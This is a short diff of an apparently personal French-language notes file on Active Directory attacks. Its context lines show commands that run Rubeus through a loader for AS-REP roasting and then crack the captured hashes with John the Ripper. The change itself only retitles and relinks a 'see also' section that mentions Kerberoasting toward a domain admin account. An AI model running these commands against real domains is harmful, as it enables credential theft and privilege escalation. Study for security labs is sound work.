@@ -32,7 +32,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asreproast /user:VPN1u
 C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe -wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
 ```
 
-## Related
-- [[Cheatsheet - Kerberoasting]]
+## Voir aussi
+- [[Cheatsheet - Kerberoasting]] — variante sur SPN (compte de domaine requis, cible souvent DA via `svcadmin`)
+- [[Cheatsheet - Tickets Kerberos]]
 - [[Synthèse - Kerberos]]
-- [[Attaques AD - MOC]]
